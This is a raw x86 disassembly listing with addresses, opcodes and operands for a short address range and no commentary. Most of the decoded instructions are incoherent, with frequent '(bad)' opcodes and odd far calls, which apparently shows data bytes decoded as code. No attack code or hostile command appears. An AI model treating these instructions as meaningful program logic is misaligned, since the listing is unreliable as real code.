  413893:	jmp    esp
  413895:	pop    edi
  413896:	inc    edi
  413897:	(bad)  
  413898:	fsub   QWORD PTR [ebp+0x50]
  41389b:	dec    edi
  41389d:	leave  
  41389e:	(bad)  
  41389f:	call   eax
  4138a1:	(bad)  
  4138a3:	call   FWORD PTR [edi-0x65016262]
  4138a9:	call   0x0:0x3f9a
	...
  4138bc:	xchg   ebx,eax
  4138bd:	xchg   ebx,eax
  4138be:	xchg   ebp,eax
  4138bf:	xchg   bh,cl
  4138c1:	enter  0xffc7,0xcc
  4138c5:	(bad)
  4138c8:	mov    dl,0xb1
  4138ca:	scas   al,BYTE PTR es:[edi]
  4138cb:	(bad)  
  4138cc:	mov    ebx,0xc2ffbbba
  4138d1:	ret    0xffc3
  4138d4:	lods   al,BYTE PTR ds:[esi]
  4138d5:	stos   BYTE PTR es:[edi],al
  4138d6:	stos   DWORD PTR es:[edi],eax
  4138d7:	jmp    FWORD PTR [edx-0x4f005556]
  4138dd:	mov    al,0xb0
  4138df:	inc    eax
  4138e1:	rol    ecx,0xff
  4138e4:	mov    al,0xb6
  4138e6:	mov    edx,0x1f2487ff
  4138eb:	call   DWORD PTR [ecx-0x6800ede4]
  4138f1:	cs daa 
  4138f3:	call   DWORD PTR [ebx-0x6e00e1da]
  4138f9:	and    ebx,DWORD PTR [ebx]
  4138fb:	dec    DWORD PTR [esi-0x7000e8e1]
  413901:	pop    ds
  413902:	push   ss
  413903:	dec    DWORD PTR [edi-0x7000f7eb]
  413909:	or     eax,DWORD PTR [eax]
  41390b:	call   DWORD PTR [ebp-0x6c00fff2]
  413911:	cmp    BYTE PTR [esi],ch
  413913:	(bad)  
  413914:	mov    ebp,0xd4ffadaf
  413919:	aam    0xd4
  41391b:	dec    ecx
  41391d:	leave  
  41391e:	leave  
  41391f:	inc    edx
  413921:	ret    0xffc2
  413924:	enter  0xc5c5,0xff
  413928:	xchg   BYTE PTR [edi],dh
  41392a:	sub    edi,edi
  41392c:	shl    DWORD PTR [eax+0x4e],1
  41392f:	call   esi
  413931:	ins    DWORD PTR es:[edi],dx
  413932:	pop    ebx
  413933:	(bad)  
  413934:	fldcw  WORD PTR [ebx+0x58]
  413937:	(bad)  
  413938:	fld    TBYTE PTR [ebp+0x5a]
  41393b:	(bad)  
  41393c:	fisubr WORD PTR [esi+0x5b]
  41393f:	jmp    eax
  413941:	jo     0x4139a0
  413943:	jmp    ebx
  413945:	jno    0x4139a4
  413947:	jmp    ebp
  413949:	jae    0x4139a9
  41394b:	jmp    esi
  41394d:	je     0x4139ae
  41394f:	jmp    edi
  413951:	js     0x4139b6
  413953:	(bad)  
  413954:	call   0xe54091c7
  413959:	push   0x54
  41395b:	call   edx
  41395d:	(bad)
  413960:	aad    0xdd
  413962:	(bad)  
  413964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413965:	mov    ds:0x9999ffa2,al
  41396a:	cdq    
  41396b:	push   0x0
	...
  41397c:	xchg   ebx,eax
  41397d:	xchg   edx,eax
  41397e:	xchg   esi,eax
  41397f:	xchg   ah,cl
  413981:	(bad)  
  413982:	enter  0xc6ff,0xbe
  413986:	sar    bh,0xa5
  413989:	mov    ds:0xb6b9ffa0,eax
  41398e:	mov    bh,0xff
  413990:	mov    ah,0xc7
  413993:	push   DWORD PTR [ecx-0x4d004f51]
  413999:	mov    bl,0xb2
  41399b:	(bad)  
  41399c:	mov    ecx,0xc3ffb9b9
  4139a1:	ret    
  4139a2:	ret    
  4139a3:	push   DWORD PTR [esi-0x71003b41]
  4139a9:	ds cmp edi,edi
  4139ac:	xchg   ecx,eax
  4139ad:	sbb    edx,DWORD PTR [ecx]
  4139af:	call   FWORD PTR [eax+edi*1+0x2f97ff31]
  4139b6:	sub    bh,bh
  4139b8:	xchg   ebp,eax
  4139b9:	sub    esp,DWORD PTR ds:0x212994ff
  4139bf:	call   DWORD PTR [esi-0x6e00e2d8]
  4139c5:	adc    BYTE PTR [edi+edi*8],al
  4139c8:	(bad)  
  4139c9:	or     eax,0x3085ff00
  4139ce:	daa    
  4139cf:	dec    edx
  4139d1:	mov    esp,0xececffbb
  4139d6:	in     al,dx
  4139d7:	(bad)  
  4139d8:	(bad)  
  4139da:	aam    0xff
  4139dc:	mov    bh,0x94
  4139de:	nop
  4139df:	inc    ebp
  4139e1:	mov    edx,0xdedeffb8
  4139e6:	fdivp  st(7),st
  4139e8:	mov    dl,0xa1
  4139ea:	lahf   
  4139eb:	push   DWORD PTR [edx-0x2200aea0]
  4139f1:	jns    0x413a5c
  4139f3:	(bad)  
  4139f4:	fbstp  TBYTE PTR [edi+0x66]
  4139f7:	jmp    edx
  4139f9:	jns    0x413a62
  4139fb:	jmp    esi
  4139fd:	jnp    0x413a67
  4139ff:	jmp    esi
  413a01:	jl     0x413a6c
  413a03:	(bad)  
  413a04:	call   0xeb40a486
  413a09:	jg     0x413a76
  413a0b:	(bad)  
  413a0c:	jmp    0x41398e
  413a0e:	ins    BYTE PTR es:[edi],dx
  413a0f:	(bad)  
  413a10:	in     al,dx
  413a11:	sub    BYTE PTR [ebp-0x1],0xf0
  413a15:	sub    BYTE PTR [ebx-0x1],0xea
  413a19:	ins    DWORD PTR es:[edi],dx
  413a1a:	push   ebp
  413a1b:	call   edx
  413a1d:	mov    esp,0xdfd5ffb7
  413a22:	loope  0x413a23
  413a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a27:	call   FWORD PTR [ecx+0x8b9999]
	...
  413a39:	add    BYTE PTR [eax],al
  413a3b:	add    BYTE PTR [edx+edx*4-0x3f39796c],dl
  413a42:	sar    bh,0xbe
  413a45:	mov    ebx,0x9fa3ffbb
  413a4a:	lahf   
  413a4b:	push   DWORD PTR [esi-0x36004a4c]
  413a51:	retf   
  413a52:	leave  
  413a53:	(bad)  
  413a54:	mov    ecx,0xb9ffb9bb
  413a59:	mov    ecx,0xbcbcffb9
  413a5e:	mov    esp,0xc7c6c6ff
  413a63:	(bad)  
  413a64:	mov    ecx,0x99ffc7c3
  413a69:	push   esi
  413a6a:	push   edx
  413a6b:	call   DWORD PTR [ecx-0x5c00eee6]
  413a71:	inc    esp
  413a72:	cmp    eax,0x32379cff
  413a77:	call   FWORD PTR [edx-0x6200d0ca]
  413a7d:	cmp    BYTE PTR [edi],ch
  413a7f:	call   FWORD PTR [ebx-0x7500e5da]
  413a85:	push   cs
  413a86:	add    edi,edi
  413a88:	cmp    DWORD PTR ds:0xd4daff36,0xffffffd3
  413a92:	(bad)  
  413a93:	(bad)  
  413a94:	out    dx,al
  413a95:	out    dx,al
  413a96:	out    dx,al
  413a97:	call   FWORD PTR [edi-0x5300a69e]
  413a9d:	and    BYTE PTR [edi+edi*8],cl
  413aa0:	mov    bl,0x77
  413aa2:	outs   dx,BYTE PTR ds:[esi]
  413aa3:	jmp    eax
  413aa5:	loopne 0x413a87
  413aa7:	(bad)  
  413aa8:	out    dx,al
  413aa9:	out    dx,al
  413aaa:	out    dx,al
  413aab:	jmp    DWORD PTR [eax-0x28008581]
  413ab1:	jg     0x413b23
  413ab3:	jmp    ebp
  413ab5:	test   BYTE PTR [ebx-0x1],dh
  413ab8:	jmp    0xeb40b043
  413abd:	xchg   DWORD PTR [ebp-0x1],esi
  413ac0:	in     al,dx
  413ac1:	mov    DWORD PTR [edi-0x1],esi
  413ac4:	out    dx,al
  413ac5:	mov    bh,BYTE PTR [eax-0x1]
  413ac8:	lock mov edi,DWORD PTR [ecx-0x1]
  413acc:	icebp  
  413acd:	lea    edi,[edx-0x1]
  413ad0:	repnz (bad) 
  413ad2:	jl     0x413ad3
  413ad4:	not    BYTE PTR [ecx+0x74f3ff7d]
  413ada:	pop    ebp
  413adb:	(bad)  
  413adc:	fdiv   DWORD PTR [edx-0x1d2a0056]
  413ae2:	in     al,0xff
  413ae4:	test   eax,0x96ffaaaa
  413ae9:	xchg   esi,eax
  413aea:	xchg   esi,eax
  413aeb:	mov    bl,0x0
	...
  413af9:	add    BYTE PTR [eax],al
  413afb:	add    BYTE PTR [edx-0x43796a6d],dl
  413b01:	mov    eax,0xb2bbffba
  413b06:	mov    ah,0xff
  413b08:	mov    eax,ds:0xb4ff9a99
  413b0d:	mov    dl,0xb4
  413b0f:	dec    esp
  413b11:	int    0xcf
  413b13:	(bad)  
  413b14:	mov    esi,0xbdffbec0
  413b19:	mov    ebp,0xbfbfffbd
  413b1e:	mov    edi,0xc6c6c6ff
  413b23:	(bad)  
  413b24:	mov    edx,0x97ffc7c4
  413b29:	call   WORD PTR gs:[ecx-0x5700ede6]
  413b31:	push   eax
  413b32:	dec    eax
  413b33:	jmp    DWORD PTR [ecx-0x5e00c2be]
  413b39:	inc    edx
  413b3a:	cmp    edi,edi
  413b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b3d:	inc    edx
  413b3e:	cmp    bh,bh
  413b40:	xchg   ebp,eax
  413b41:	pop    ss
  413b42:	or     bh,bh
  413b44:	(bad)  
  413b45:	and    bl,BYTE PTR [edx]
  413b47:	dec    ecx
  413b49:	mov    eax,0xffffffb6
  413b4e:	(bad)  
  413b4f:	(bad)  
  413b50:	jmp    0xaa41223c
  413b55:	push   0x61
  413b57:	jmp    FWORD PTR [ecx-0x4600fae6]
  413b5d:	sbb    BYTE PTR [eax],al
  413b5f:	push   DWORD PTR [eax-0x2e00e4d2]
  413b65:	mov    edi,0xf2f2ffbd
  413b6a:	bnd jmp edx
  413b6d:	loope  0x413b50
  413b6f:	jmp    FWORD PTR [eax-0x1400968e]
  413b75:	xchg   edx,eax
  413b76:	cmp    edi,0xff8393ee
  413b7c:	out    dx,eax
  413b7d:	xchg   ebp,eax
  413b7e:	test   bh,bh
  413b80:	icebp  
  413b81:	xchg   esi,eax
  413b82:	test   edi,edi
  413b84:	repz xchg edi,eax
  413b86:	xchg   bh,bh
  413b88:	cmc    
  413b89:	cwde   
  413b8a:	xchg   edi,edi
  413b8c:	cmc    
  413b8d:	cdq    
  413b8e:	mov    bh,bh
  413b90:	neg    BYTE PTR [edx-0x5f060077]
  413b96:	mov    ?,edi
  413b98:	stc    
  413b99:	sub    BYTE PTR [edx-0x1],0xdb
  413b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9e:	call   0xb5ff:0xe4e2d8ff
  413ba5:	mov    ch,0xb5
  413ba7:	call   DWORD PTR [edi+0xc99797]
	...
  413bb9:	add    BYTE PTR [eax],al
  413bbb:	add    BYTE PTR [ebx-0x43796a6e],dl
  413bc1:	scas   al,BYTE PTR es:[edi]
  413bc2:	mov    ah,0xff
  413bc4:	ret    
  413bc5:	stos   BYTE PTR es:[edi],al
  413bc6:	mov    dl,0xff
  413bc8:	test   eax,0xb3ffa09c
  413bcd:	mov    cl,0xb6
  413bcf:	dec    ebp
  413bd1:	iret   
  413bd2:	iret   
  413bd3:	inc    ebx
  413bd5:	(bad)  
  413bd9:	ret    0xffc2
  413bdc:	(bad)  
  413bdd:	(bad)  
  413bde:	(bad)  
  413bdf:	inc    esi
  413be1:	mov    dh,0xff
  413be4:	mov    esi,0x9cffc8c6
  413be9:	jg     0x413b6b
  413beb:	dec    DWORD PTR [edi-0x5200e8e2]
  413bf1:	pop    eax
  413bf2:	push   ecx
  413bf3:	jmp    DWORD PTR [ebp-0x5400b8b4]
  413bf9:	push   ecx
  413bfa:	dec    ecx
  413bfb:	jmp    DWORD PTR [esi-0x6d00cdc4]
  413c01:	or     eax,DWORD PTR [eax]
  413c03:	call   DWORD PTR [edi-0x6600fbee]
  413c09:	inc    ecx
  413c0a:	push   DWORD PTR ss:[esi-0x62007f79]
  413c11:	inc    ebx
  413c12:	jmp    FWORD PTR ss:[esi-0x4800fae6]
  413c19:	sbb    BYTE PTR [eax],al
  413c1b:	(bad)  
  413c1c:	mov    esi,0xc4ff001b
  413c21:	sbb    al,BYTE PTR [eax]
  413c23:	push   DWORD PTR [ecx-0x1700aea4]
  413c29:	call   0xfe3f3c16
  413c2e:	std    
  413c2f:	(bad)  
  413c30:	mov    esi,0xcdffb0b2
  413c35:	mov    BYTE PTR [ebx-0x1],bh
  413c38:	icebp  
  413c39:	sahf   
  413c3a:	mov    ?,edi
  413c3c:	repz mov al,ds:0xa1f5ff90
  413c42:	nop
  413c43:	push   edi
  413c45:	mov    ds:0xa3f8ff91,al
  413c4a:	xchg   edx,eax
  413c4b:	(bad)  
  413c4c:	stc    
  413c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c4e:	xchg   ebx,eax
  413c4f:	(bad)  
  413c50:	cli    
  413c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c52:	xchg   esp,eax
  413c53:	(bad)  
  413c54:	sti    
  413c55:	stos   DWORD PTR es:[edi],eax
  413c56:	fwait
  413c57:	(bad)  
  413c58:	dec    DWORD PTR [edi-0x621c0087]
  413c5e:	(bad)  
  413c5f:	(bad)  
  413c60:	fcomp  st(7)
  413c62:	loop   0x413c63
  413c64:	mov    esi,0x96ffc0c0
  413c69:	xchg   esi,eax
  413c6a:	xchg   esi,eax
  413c6b:	aad    0x0
	...
  413c79:	add    BYTE PTR [eax],al
  413c7b:	add    BYTE PTR [esp+ecx*4-0x566a796a],bl
  413c82:	popf   
  413c83:	jmp    DWORD PTR [ecx-0x25]
  413c86:	pushf  
  413c87:	call   DWORD PTR [ecx-0x3c005845]
  413c8d:	lods   al,BYTE PTR ds:[esi]
  413c8e:	mov    eax,0xd1d1d0ff
  413c93:	inc    edi
  413c95:	mov    edi,0xc6c6c6ff
  413c9b:	inc    edi
  413c9d:	mov    edi,0xc9c9c9ff
  413ca3:	inc    edx
  413ca5:	(bad)  
  413ca6:	retf   0xa9ff
  413ca9:	call   0xff1d:0x268dff9a
  413cb0:	scas   eax,DWORD PTR es:[edi]
  413cb1:	pop    ebx
  413cb2:	push   ebp
  413cb3:	jmp    FWORD PTR [ecx+ebx*2+0x5db2ff51]
  413cba:	push   esp
  413cbb:	call   FWORD PTR [ebp-0x6c00e4d7]
  413cc1:	or     DWORD PTR [eax],eax
  413cc3:	call   FWORD PTR [ebp-0x5a00ffef]
  413cc9:	adc    eax,DWORD PTR [eax]
  413ccb:	jmp    FWORD PTR [ecx-0x5100f9e6]
  413cd1:	push   ss
  413cd2:	add    bh,bh
  413cd4:	mov    ch,0x18
  413cd6:	add    bh,bh
  413cd8:	mov    ebx,0xc3ff0019
  413cdd:	sbb    eax,DWORD PTR [eax]
  413cdf:	inc    edi
  413ce1:	sbb    BYTE PTR [eax],al
  413ce3:	inc    edx
  413ce5:	and    ecx,DWORD PTR [ecx]
  413ce7:	dec    edx
  413ce9:	scas   eax,DWORD PTR es:[edi]
  413cea:	stos   BYTE PTR es:[edi],al
  413ceb:	push   edx
  413ced:	repnz repnz (bad) 
  413cf0:	sti    
  413cf1:	sti    
  413cf2:	sti    
  413cf3:	jmp    FWORD PTR [ecx-0x12007773]
  413cf9:	mov    ds:0xa9f7ff95,al
  413cfe:	call   0xf9ff:0x9babf9ff
  413d05:	lods   al,BYTE PTR ds:[esi]
  413d06:	pushf  
  413d07:	(bad)  
  413d08:	sti    
  413d09:	lods   eax,DWORD PTR ds:[esi]
  413d0a:	sahf   
  413d0b:	(bad)  
  413d0c:	cld    
  413d0d:	scas   al,BYTE PTR es:[edi]
  413d0e:	sahf   
  413d0f:	(bad)  
  413d10:	std    
  413d11:	scas   al,BYTE PTR es:[edi]
  413d12:	lahf   
  413d13:	(bad)  
  413d14:	(bad)  
  413d15:	mov    ch,0xa5
  413d17:	(bad)  
  413d18:	call   FWORD PTR [ebp-0x60120077]
  413d1e:	nop
  413d1f:	(bad)  
  413d20:	fchs   
  413d22:	loopne 0x413d23
  413d24:	ret    
  413d25:	mov    bh,0xff
  413d28:	xchg   esi,eax
  413d29:	xchg   ebp,eax
  413d2a:	xchg   ebp,eax
  413d2b:	in     al,0x0
	...
  413d39:	add    BYTE PTR [eax],al
  413d3b:	add    BYTE PTR [edi+0x347d9a8b],bl
  413d41:	int    0x7e
  413d43:	inc    DWORD PTR [eax]
  413d45:	jmp    FWORD PTR [ebx-0x1]
  413d48:	je     0x413d01
  413d4a:	fwait
  413d4b:	dec    edx
  413d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d4e:	mov    edx,0xd3d3d3ff
  413d53:	dec    ebx
  413d55:	retf   
  413d56:	retf   
  413d57:	dec    ecx
  413d59:	leave  
  413d5a:	leave  
  413d5b:	dec    ebx
  413d5d:	retf   
  413d5e:	retf   
  413d5f:	dec    ebx
  413d61:	retf   
  413d62:	retf   
  413d63:	dec    edx
  413d65:	int    0xcf
  413d67:	push   DWORD PTR [edx-0x6e005052]
  413d6d:	xor    BYTE PTR [edx],ch
  413d6f:	push   DWORD PTR [ecx-0x4b00aaa6]
  413d75:	addr16 pop edi
  413d77:	push   DWORD PTR [ebp-0x6800a9a1]
  413d7d:	push   ss
  413d7e:	or     bh,bh
  413d80:	cwde   
  413d81:	or     al,BYTE PTR [eax]
  413d83:	jmp    DWORD PTR [ecx-0x5800ffee]
  413d89:	adc    al,0x0
  413d8b:	jmp    FWORD PTR [ebp+edx*1+0x16b2ff00]
  413d92:	add    bh,bh
  413d94:	mov    bh,0x18
  413d96:	add    bh,bh
  413d98:	mov    esi,0xc4ff001a
  413d9d:	sbb    al,0x0
  413d9f:	dec    ecx
  413da1:	pop    ss
  413da2:	add    bh,bh
  413da4:	shl    BYTE PTR [edi],cl
  413da6:	or     bh,bh
  413da8:	ret    0x7481
  413dab:	(bad)  
  413dac:	fcom   st(3)
  413dae:	sar    edi,cl
  413db0:	cmc    
  413db1:	cmc    
  413db2:	cmc    
  413db3:	(bad)  
  413db4:	in     al,dx
  413db5:	jmp    0x413da2
  413db7:	jmp    FWORD PTR [ebp-0x600837d]
  413dbd:	mov    bl,0xa5
  413dbf:	(bad)  
  413dc0:	sti    
  413dc1:	mov    ah,0xa5
  413dc3:	(bad)  
  413dc4:	cld    
  413dc5:	mov    dh,0xa7
  413dc7:	(bad)  
  413dc8:	(bad)  
  413dc9:	mov    bh,0xa7
  413dcb:	(bad)  
  413dcc:	(bad)  
  413dcd:	mov    eax,0xb7ffffa8
  413dd2:	test   eax,0xafbdffff
  413dd7:	(bad)  
  413dd8:	jmp    FWORD PTR [ebp-0x5e110066]
  413dde:	(bad)  
  413ddf:	(bad)  
  413de0:	fcmovnu st,st(6)
  413de2:	fdivp  st(7),st
  413de4:	enter  0xcdcb,0xff
  413de8:	xchg   ebp,eax
  413de9:	xchg   ebp,eax
  413dea:	xchg   ebp,eax
  413deb:	lock fwait
  413ded:	fwait
  413dee:	fwait
  413def:	and    BYTE PTR [eax],al
	...
  413df9:	add    BYTE PTR [eax],al
  413dfb:	add    BYTE PTR [edx+0x3e6e9f9a],bl
  413e01:	xchg   esp,eax
  413e02:	inc    DWORD PTR ds:0x1b54
  413e07:	(bad)  
  413e08:	jge    0x413e7c
  413e0a:	je     0x413e0b
  413e0c:	ret    
  413e0d:	mov    edx,0xd8d5ffc3
  413e12:	fcos   
  413e14:	iret   
  413e15:	iret   
  413e16:	iret   
  413e17:	dec    esp
  413e19:	int3   
  413e1a:	int3   
  413e1b:	dec    ebp
  413e1d:	int    0xcd
  413e1f:	dec    esi
  413e21:	into   
  413e22:	into   
  413e23:	call   eax
  413e25:	rcl    esp,cl
  413e27:	(bad)  
  413e28:	mov    esp,0x96ffbbb8
  413e2d:	cmp    dh,BYTE PTR [edi+edi*8]
  413e30:	mov    cl,0x5c
  413e32:	push   ebp
  413e33:	(bad)  
  413e34:	mov    esi,0xacff727a
  413e39:	dec    esp
  413e3a:	inc    edx
  413e3b:	call   DWORD PTR [ebp-0x6100fff7]
  413e41:	(bad)  
  413e43:	jmp    DWORD PTR [ebp-0x5600ffed]
  413e49:	adc    al,0x0
  413e4b:	push   DWORD PTR [eax-0x4700ffea]
  413e51:	sbb    DWORD PTR [eax],eax
  413e53:	inc    ebx
  413e55:	sbb    eax,DWORD PTR [eax]
  413e57:	dec    ebx
  413e59:	push   ds
  413e5a:	add    bh,bh
  413e5c:	rcr    DWORD PTR [edi],cl
  413e5e:	add    bh,bh
  413e60:	ficom  DWORD PTR [edi]
  413e62:	add    bh,bh
  413e64:	out    0x3d,al
  413e66:	sbb    eax,0x99aaf7ff
  413e6b:	(bad)  
  413e6c:	mov    edi,0xd7ff9ba2
  413e71:	xlat   BYTE PTR ds:[ebx]
  413e72:	xlat   BYTE PTR ds:[ebx]
  413e73:	(bad)  
  413e74:	out    dx,eax
  413e75:	out    dx,eax
  413e76:	out    dx,eax
  413e77:	inc    esi
  413e79:	mov    edi,0x9dcdffbd
  413e7e:	xchg   ecx,eax
  413e7f:	(bad)  
  413e80:	inc    edx
  413e82:	mov    cl,0xff
  413e84:	inc    ebx
  413e86:	mov    bl,0xff
  413e88:	inc    ebp
  413e8a:	mov    bl,0xff
  413e8c:	inc    esi
  413e8e:	mov    ah,0xff
  413e90:	inc    edi
  413e92:	mov    ch,0xff
  413e94:	dec    edx
  413e96:	mov    ecx,0xadc2ffff
  413e9b:	push   ecx
  413e9d:	test   eax,0xdadeff8f
  413ea2:	fcos   
  413ea4:	int    0xd1
  413ea6:	sar    edi,cl
  413ea8:	xchg   esi,eax
  413ea9:	xchg   esi,eax
  413eaa:	xchg   esi,eax
  413eab:	cld    
  413eac:	fwait
  413ead:	fwait
  413eae:	fwait
  413eaf:	dec    edx
	...
  413ebc:	cdq    
  413ebd:	xchg   edi,eax
  413ebe:	pushf  
  413ebf:	outs   dx,BYTE PTR ds:[esi]
  413ec0:	arpl   WORD PTR [ebp+edx*2-0x1],ax
  413ec4:	daa    
  413ec5:	add    BYTE PTR [edx],al
  413ec7:	(bad)  
  413ec8:	jl     0x413f37
  413eca:	ins    BYTE PTR es:[edi],dx
  413ecb:	(bad)  
  413ecc:	mov    ebp,0xd5ffc1c0
  413ed1:	(bad)  
  413ed2:	xlat   BYTE PTR ds:[ebx]
  413ed3:	call   eax
  413ed5:	rcl    al,1
  413ed7:	dec    edi
  413ed9:	iret   
  413eda:	iret   
  413edb:	call   ecx
  413edd:	rcl    ecx,1
  413edf:	call   edx
  413ee1:	rcl    dl,cl
  413ee3:	call   esi
  413ee5:	xlat   BYTE PTR ds:[ebx]
  413ee6:	fdivr  st,st(7)
  413ee8:	mov    ebx,0x95ffbcbb
  413eed:	cmp    al,0x34
  413eef:	push   DWORD PTR [edi+ebx*2-0x7f3b00a7]
  413ef6:	jp     0x413ef7
  413ef8:	lahf   
  413ef9:	sub    bl,BYTE PTR ds:0x799ff
  413eff:	jmp    DWORD PTR [esi-0x5100ffee]
  413f05:	adc    eax,0x18b6ff00
  413f0a:	add    bh,bh
  413f0c:	ret    0x1b
  413f0f:	dec    edx
  413f11:	push   ds
  413f12:	add    bh,bh
  413f14:	shl    BYTE PTR [eax],cl
  413f16:	add    bh,bh
  413f18:	(bad)  [edx]
  413f1a:	add    bh,bh
  413f1c:	loop   0x413f40
  413f1e:	add    bh,bh
  413f20:	call   0xf5403f40
  413f25:	pop    ecx
  413f26:	aaa    
  413f27:	(bad)  
  413f28:	std    
  413f29:	mov    edi,0xc4f5ffb3
  413f2e:	mov    ecx,0xaaaec1ff
  413f33:	dec    edi
  413f35:	iret   
  413f36:	iret   
  413f37:	jmp    eax
  413f39:	loopne 0x413f1b
  413f3b:	jmp    FWORD PTR [ecx-0x17006663]
  413f41:	mov    edx,0xccffffab
  413f46:	mov    esp,0xbdceffff
  413f4b:	(bad)  
  413f4c:	dec    edi
  413f4e:	mov    esi,0xbed0ffff
  413f53:	(bad)  
  413f54:	call   esp
  413f56:	ret    0xffff
  413f59:	sar    DWORD PTR [edi+edi*8-0x70520a],1
  413f60:	(bad)  
  413f62:	sar    edi,1
  413f64:	rcl    edi,cl
  413f66:	fcos   
  413f68:	cwde   
  413f69:	xchg   edi,eax
  413f6a:	xchg   edi,eax
  413f6b:	call   FWORD PTR [edx+0x719a9a]
	...
  413f79:	add    BYTE PTR [eax],al
  413f7b:	add    BYTE PTR [esi+0x6879a19d],bl
  413f81:	fs call DWORD PTR gs:[ebx+ecx*2+0x43]
  413f87:	inc    DWORD PTR [edi-0x52008080]
  413f8d:	scas   al,BYTE PTR es:[edi]
  413f8e:	mov    cl,0xff
  413f90:	loope  0x413f73
  413f92:	loop   0x413f93
  413f94:	iret   
  413f95:	iret   
  413f96:	iret   
  413f97:	dec    eax
  413f99:	enter  0xffc8,0xce
  413f9d:	into   
  413f9e:	into   
  413f9f:	call   edx
  413fa1:	rcl    dl,cl
  413fa3:	(bad)  
  413fa4:	fcmovnu st,st(3)
  413fa6:	(bad)  
  413fa8:	mov    ebx,0x8fffc1c0
  413fad:	ds cmp edi,edi
  413fb0:	mov    ecx,0xbfff5d65
  413fb5:	jb     0x414020
  413fb7:	call   FWORD PTR [eax+edx*1+0xfa5ff04]
  413fbe:	add    bh,bh
  413fc0:	lods   eax,DWORD PTR ds:[esi]
  413fc1:	adc    eax,0x17b5ff00
  413fc6:	add    bh,bh
  413fc8:	mov    esi,0xc6ff001a
  413fcd:	sbb    al,0x0
  413fcf:	dec    ebp
  413fd1:	push   ds
  413fd2:	add    bh,bh
  413fd4:	aam    0x21
  413fd6:	add    bh,bh
  413fd8:	(bad)  [ebx]
  413fda:	add    bh,bh
  413fdc:	jecxz  0x414000
  413fde:	add    bh,bh
  413fe0:	jmp    0x414001
  413fe2:	add    bh,bh
  413fe4:	div    BYTE PTR [edx+0x56]
  413fe7:	(bad)  
  413fe8:	dec    dh
  413fea:	(bad)  
  413feb:	(bad)  
  413fec:	dec    esi
  413fee:	(bad)  
  413ff1:	shl    DWORD PTR [edi-0x4f4d4401],0xff
  413ff8:	leave  
  413ff9:	leave  
  413ffa:	leave  
  413ffb:	(bad)  
  413ffc:	fcomp  st(0)
  413ffe:	fdivr  st,st(7)
  414000:	mov    al,ds:0xf5ff8a90
  414005:	int3   
  414006:	mov    ebp,0xc5d5ffff
  41400b:	(bad)  
  41400c:	call   esi
  41400e:	(bad)  
  414011:	(bad)  
  414012:	(bad)  
  414013:	(bad)  
  414014:	(bad)  
  414015:	fmul   st,st(1)
  414017:	(bad)  
  414018:	(bad)  
  414019:	fcmove st,st(2)
  41401b:	(bad)  
  41401c:	sti    
  41401d:	mov    bl,0x95
  41401f:	(bad)  
  414020:	(bad)  
  414022:	(bad)  
  414023:	(bad)  
  414024:	fsubr  st(0),st
  414026:	loop   0x414027
  414028:	call   0x9999:0x99ff9b9b
  41402f:	mov    eax,DWORD PTR [eax]
	...
  414039:	add    BYTE PTR [eax],al
  41403b:	add    BYTE PTR [ebp-0x6fc55a5e],ah
  414041:	xchg   ecx,eax
  414042:	(bad)  
  414043:	call   DWORD PTR [edx-0x61006e6c]
  414049:	cdq    
  41404a:	pushf  
  41404b:	(bad)  
  41404c:	fcmovu st,st(0)
  41404e:	(bad)  
  414050:	(bad)  
  414051:	(bad)  
  414052:	(bad)  
  414053:	(bad)  
  414054:	clc    
  414055:	clc    
  414056:	clc    
  414057:	jmp    ebp
  414059:	in     eax,0xe5
  41405b:	(bad)  
  41405c:	(bad)  
  41405e:	fcos   
  414060:	rcl    ebx,cl
  414062:	sar    edi,cl
  414064:	rcl    ebx,cl
  414066:	sar    edi,cl
  414068:	ror    al,0xc9
  41406b:	call   DWORD PTR [ecx-0x4400b5b1]
  414071:	pusha  
  414072:	push   edi
  414073:	push   DWORD PTR [ecx+edx*2+0x69cff44]
  41407a:	add    bh,bh
  41407c:	test   al,0x13
  41407e:	add    bh,bh
  414080:	scas   eax,DWORD PTR es:[edi]
  414081:	adc    eax,0x18b8ff00
  414086:	add    bh,bh
  414088:	rcr    BYTE PTR [ebx],0x0
  41408b:	inc    edi
  41408d:	sbb    eax,0x20d0ff00
  414092:	add    bh,bh
  414094:	xlat   BYTE PTR ds:[ebx]
  414095:	and    DWORD PTR [eax],eax
  414097:	(bad)  
  414098:	fisub  WORD PTR [ebx]
  41409a:	add    bh,bh
  41409c:	call   0xf04040bf
  4140a1:	daa    
  4140a2:	add    edi,edi
  4140a4:	cli    
  4140a5:	xchg   ecx,eax
  4140a6:	jnp    0x4140a7
  4140a8:	(bad)  
  4140a9:	fcmovnbe st,st(4)
  4140ab:	(bad)  
  4140ac:	call   ebp
  4140ae:	retf   
  4140af:	(bad)  
  4140b0:	call   esp
  4140b2:	leave  
  4140b3:	call   esi
  4140b5:	mov    bh,0xae
  4140b7:	push   DWORD PTR [edi-0x39004c4c]
  4140bd:	mov    dh,0xff
  4140c0:	retf   
  4140c1:	retf   
  4140c2:	retf   
  4140c3:	jmp    DWORD PTR [esi-0x600726c]
  4140c9:	(bad)  
  4140ca:	(bad)  
  4140cb:	(bad)  
  4140cc:	(bad)  
  4140cd:	fmul   st(5),st
  4140cf:	(bad)  
  4140d0:	(bad)  
  4140d1:	fmul   st(6),st
  4140d3:	(bad)  
  4140d4:	(bad)  
  4140d5:	(bad)  
  4140d7:	(bad)  
  4140d8:	jmp    esp
  4140da:	xlat   BYTE PTR ds:[ebx]
  4140db:	(bad)  
  4140dc:	(bad)  
  4140dd:	mov    esi,0xc6e0ffa2
  4140e2:	mov    ebp,0xeae7e1ff
  4140e7:	jmp    DWORD PTR [eax-0x66005f60]
  4140ed:	cdq    
  4140ee:	cdq    
  4140ef:	sahf   
	...
  414100:	mov    ah,0xb4
  414102:	mov    bl,0x41
  414104:	int3   
  414105:	into   
  414106:	iret   
  414107:	xchg   esi,eax
  414108:	mov    bl,0xb6
  41410a:	mov    bh,0xf1
  41410c:	aad    0xd5
